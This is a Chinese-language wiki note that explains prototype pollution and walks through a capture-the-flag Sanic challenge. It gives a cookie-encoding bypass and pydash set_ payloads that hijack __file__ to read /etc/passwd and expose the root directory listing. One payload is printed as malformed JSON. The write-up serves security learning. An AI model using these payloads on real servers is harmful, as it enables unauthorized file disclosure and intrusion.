---
{"dg-publish":true,"permalink":"/choco-s-wiki/notes/python/"}
---


## 原型链污染
原型链污染（Prototype Pollution）一开始指的是 JavaScript 中，通过不当的代码操作，修改了 JavaScript 中对象的原型（prototype），从而影响到所有继承该原型的对象。

在 JavaScript 中，原型链污染可能导致严重的安全问题，例如：

1. **破坏性修改**：通过修改全局对象的原型，可以影响所有实例，导致预期之外的行为。
2. **安全漏洞**：攻击者可以利用原型链污染来注入恶意代码，执行任意操作。

以下是一个 JavaScript 示例，演示了原型链污染：

```javascript
let maliciousPayload = '{"__proto__": {"polluted": "Yes, I am polluted"}}'; 
let obj = JSON.parse(maliciousPayload); 
console.log({}.polluted);  // Output: "Yes, I am polluted"
```

在这个例子中，通过解析一个恶意的 JSON 字符串，将 `polluted` 属性注入到了所有对象的原型上。

### Python中的原型链污染
在 Python 中，没有与 JavaScript 完全相同的原型链概念，但类似的问题可以通过以下方式发生：

1. **全局变量污染**：通过不当的全局变量操作，影响到全局命名空间中的其他代码。
2. **类属性污染**：通过修改类属性，影响所有实例的行为。

```python
class Example:
    shared_attr = "I am shared"

# 创建两个实例
a = Example()
b = Example()

# 修改一个实例的类属性
a.shared_attr = "I am changed"

# 打印另一个实例的类属性
print(b.shared_attr)  # 输出: "I am shared"

# 修改类本身的属性
Example.shared_attr = "I am changed again"

# 打印实例的类属性
print(a.shared_attr)  # 输出: "I am changed"
print(b.shared_attr)  # 输出: "I am changed again"

```

## 从一台赛题开始实战
第十七届全国大学生信息安全竞赛—创新实践能力赛初赛 Sanic

直接上源码
```python
from sanic import Sanic  
from sanic.response import text, html  
from sanic_session import Session  
import pydash  
# pydash==5.1.2  
  
class Pollute:  
    def __init__(self):  
        pass  
  
app = Sanic(__name__)  
app.static("/static/", "./static/")  
Session(app)  
  
@app.route('/', methods=['GET', 'POST'])  
async def index(request):  
    return html(open('static/index.html').read())  
  
@app.route("/login")  
async def login(request):  
    user = request.cookies.get("user")  
    if user.lower() == 'adm;n':  
        request.ctx.session['admin'] = True  
        return text("login success")  
  
    return text("login fail")  
  
@app.route("/src")  
async def src(request):  
    return text(open(__file__).read())  
  
@app.route("/admin", methods=['GET', 'POST'])  
async def admin(request):  
    if request.ctx.session.get('admin') == True:  
        key = request.json['key']  
        value = request.json['value']  
        if key and value and type(key) is str and '_.' not in key:  
            pollute = Pollute()  
            pydash.set_(pollute, key, value)  
            return text("success")  
        else:  
            return text("forbidden")  
  
    return text("forbidden")  
  
if __name__ == '__main__':  
    app.run(host='0.0.0.0')
```

### 考点1: RFC2068 的编码规则
构造cookie.user= `'adm;n'`,但有个` ; ` 直接传会被截断,8进制编码绕过

```python
import requests  
  
base = ''  
  
s = requests.Session()  
  
s.cookies.update({  
    'user': '"adm\\073n"'  
})  
  
s.get(base + '/login')
```
![Pasted image 20240618160711.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020240618160711.png)

### 考点2: python的原型链污染

#### 第一次污染 任意文件读取
```python
@app.route("/src")  
async def src(request):  
    return text(open(__file__).read())  
```
默认`__file__`表示当前文件，把这个值改掉就能实现任意文件读取了

然后看到：
```python
@app.route("/admin", methods=['GET', 'POST'])  
async def admin(request):  
    if request.ctx.session.get('admin') == True:  
        key = request.json['key']  
        value = request.json['value']  
        if key and value and type(key) is str and '_.' not in key:  
            pollute = Pollute()  
            pydash.set_(pollute, key, value)  
            return text("success")  
        else:  
            return text("forbidden")  
  
    return text("forbidden")  
```

set_跟代码跟到
```python
# This is used to split a deep path string into dict keys or list indexes. This matches "." as  
# delimiter (unless it is escaped by "//") and "[<integer>]" as delimiter while keeping the  
# "[<integer>]" as an item.  
RE_PATH_KEY_DELIM = re.compile(r"(?<!\\)(?:\\\\)*\.|(\[\d+\])")

...

keys = [  
    PathToken(int(key[1:-1]), default_factory=list)  
    if RE_PATH_LIST_INDEX.match(key)  
    else PathToken(unescape_path_key(key), default_factory=dict)  
    for key in filter(None, RE_PATH_KEY_DELIM.split(value))  
]
```
发现 斜杠+. 会当作.进行处理，可以绕过题目的过滤，而 . 会作为 . 的转义不进行分割
- `abc.def`：匹配 `.`，因为它是一个不被转义的句号。
- `abc\\.def`：不匹配 `.`，因为它是被转义的句号。
poc：
```python
{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.__file__","value":"/etc/passwd"}

```

![Pasted image 20240618161151.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020240618161151.png)

#### 第二次污染 列出根目录
虽然可以读文件，但是还不知道flag的文件名，所以需要看看咋进一步利用
继续寻找可污染变量，注意到注册的 static 路由会添加 DirectoryHandler 到 route  
跟进static
大致意思就是directory_view为True时，会开启列目录功能，directory_handler中可以获取指定的目录  
跟进这个类发现directory_view和directory  
```python
class DirectoryHandler:  
    """Serve files from a directory.  
  
    Args:        uri (str): The URI to serve the files at.        directory (Path): The directory to serve files from.        directory_view (bool): Whether to show a directory listing or not.        index (Optional[Union[str, Sequence[str]]]): The index file(s) to            serve if the directory is requested. Defaults to None.    """  
    def __init__(  
        self,  
        uri: str,  
        directory: Path,  
        directory_view: bool = False,  
        index: Optional[Union[str, Sequence[str]]] = None,  
    ) -> None
```
总之就是只要将directory污染为根目录，directory_view污染为True，就可以看到根目录的所有文件了

这里引入一个细节，`__mp_main__` 通常出现在使用多处理（multiprocessing）模块时。在运行多处理代码时，尤其是在Windows操作系统上，你可能会看到这样的字符串。这是因为多处理模块在Windows上启动新的子进程时，会重新导入主模块，并将其名字设为 `__mp_main__`。

发现通过 `app.router.name_index['__mp_main__.static']` 可以访问到 `DirectoryHandler`。`DirectoryHandler`的`directory`为`Path`对象，分析发现污染 `__parts` 为分割的路径列表即可。
![Pasted image 20240621144955.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020240621144955.png)

所以构造一下poc，将directory_view污染为True:
```python
{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view","value": "True"}
```

将directory污染为根目录:
```python
"key": "__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\.static.handler.keywords.directory_handler.directory._parts", "value": ['/']}
```

![Pasted image 20240620175720.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020240620175720.png)

在通过第一次污染任意文件读取，读到flag
![Pasted image 20240618161754.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020240618161754.png)

### 总结
这道题的漏洞段主要在set_方法上，其他就是找链子，需要对框架比较熟悉。
# 参考链接
https://xz.aliyun.com/t/14620
https://mp.weixin.qq.com/s/fhMBt6GUTMBR-VSgMjpLAg